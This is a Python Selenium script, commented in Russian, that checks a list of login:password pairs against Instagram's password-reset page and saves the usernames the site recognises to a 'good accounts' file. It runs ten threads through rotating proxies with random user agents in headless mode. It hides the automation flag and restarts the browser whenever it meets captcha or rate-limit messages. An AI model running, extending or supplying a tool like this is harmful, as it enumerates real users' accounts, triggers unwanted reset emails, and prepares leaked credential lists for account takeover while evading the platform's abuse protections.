import threading
import time
import random
from selenium import webdriver
from fake_useragent import UserAgent
from selenium.common.exceptions import StaleElementReferenceException, WebDriverException, \
    ElementClickInterceptedException, NoSuchElementException


# база почт
file = open('base.txt', encoding='utf-8-sig').read().split('\n')
# запись валидных аккаунтов
goods = open('good_acc.txt', 'a+')
# прокси
proxies = open('proxy.txt').read().split('\n')
# кол-во потоков
thread_count = 10

# ip прокси
ip_proxy = ''


def thread():
    # Пока есть аккаунты
    while file:
        # Берём первый аккаунт из списка
        to_check = file[0]
        # Удаляем его из списка
        file.remove(to_check)
        try:
            # Вызываем функцию проверки аккаунта
            check_account(to_check)
        except:
            # Если что-то пойдет не так, выведет ошибку
            pass


def check_account(login):
    proxy_len = len(proxies)
    count = random.randrange(1, proxy_len)
    # берет айпи прокси и порт
    first_proxy = proxies[count]
    ip_proxy = ''
    ip_proxy += first_proxy
    ip, port = first_proxy.split(":")
    user_agent = UserAgent()
    options = webdriver.ChromeOptions()

    # отключение картинок на сайте
    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)
    # отключение режима веб-драйвера
    options.add_argument("--disable-blink-features=AutomationControlled")
    # работа в фоновом режиме
    options.add_argument("--headless")
    # опция запускающая драйвер с новым прокси
    options.add_argument(f"--proxy-server={ip}:{port}")
    # рандомный юзер агент
    options.add_argument(f"user-agent={user_agent.random}")

    # если за сколько-то минут не загрузится страница, то она закрывается
    # driver.set_page_load_timeout(3)

    driver = webdriver.Chrome(executable_path=r"chromedriver.exe", options=options)

    try:
        driver.get("https://www.instagram.com/accounts/password/reset/")
    except WebDriverException:
        print(f'Попался не рабочий прокси {ip_proxy}. Перезагрузка...')
        driver.quit()

    error_page = driver.find_elements_by_class_name("p-error.dialog-404")

    for ep in error_page:
        if ep.find_element_by_tag_name("h2").text == "Ошибка":
            print('Перезагрузка драйвера из-за "Ошибка"')
            driver.quit()

    body = driver.find_elements_by_class_name('pbNvD.FrS-d.gD9tr')

    for bd in body:
        try:
            if bd.find_element_by_class_name('aOOlW.bIiDR').text == 'Принять все':
                bd.find_element_by_class_name('aOOlW.bIiDR').click()
                time.sleep(7)
        except ElementClickInterceptedException:
            print('Перезагрузка драйвера из-за торможения "Принять все"')
            driver.quit()

    authorization = driver.find_elements_by_class_name("AHCwU")

    username = login.split(":")[0]
    password = login.split(":")[1]

    for data in authorization:

        # почта логин
        try:
            data_login = data.find_element_by_name('cppEmailOrUsername')
            data_login.click()
            data_login.send_keys(username)
            time.sleep(1)
        except ElementClickInterceptedException:
            print('Перезагрузка драйвера из-за торможения "Принять все"')
            driver.quit()
        except NoSuchElementException:
            print('Перезагрузка драйвера из-за торможения "Принять все"')
            driver.quit()

        # кнопка входа
        clock_button = data.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
        clock_button.click()

        time.sleep(2)

    pops = driver.find_elements_by_class_name("_-rjm")

    for pop in pops:
        try:
            if 'Мы отправили ссылку для восстановления' in pop.find_element_by_class_name('tA2fc').text:
                # Почта зарегана
                goods.write(username + ' : ' + password + '\n')
                print('Валидный аккаунт ' + username + ' : ' + password)
                goods.close()

        except StaleElementReferenceException:
            captcha_skip = driver.find_elements_by_class_name("UiqW5._1MP5K")

            for cs in captcha_skip:
                if "Чтобы войти, подтвердите, что это вы" in cs.find_element_by_tag_name('h2').text:
                    print('Перезагрузка драйвера из-за "Captcha"')
                    driver.quit()

        if 'Подождите несколько минут, прежде чем пытаться снова.' in pop.find_element_by_class_name('tA2fc').text:
            print('Перезагрузка драйвера из-за "Подождите несколько минут, прежде чем пытаться снова."')
            driver.quit()

        elif 'feedback_required' in pop.find_element_by_class_name('tA2fc').text:
            print('Перезагрузка драйвера из-за "feedback_required"')
            driver.quit()
        else:
            # Почта не зарегана
            print(f"Не валидный аккаунт " + username)

        # time.sleep(random.randrange(3, 10))
    driver.quit()


def main():
    for _ in range(thread_count):
        time.sleep(1)
        # Создаем наш поток. В target передаем нашу функцию. ВНИМАНИЕ: Функцию надо указывать без (), иначе мы передадим не саму функцию, а её ответ.
        t = threading.Thread(target=thread)
        # Запускаем поток
        t.start()


if __name__ == '__main__':
    main()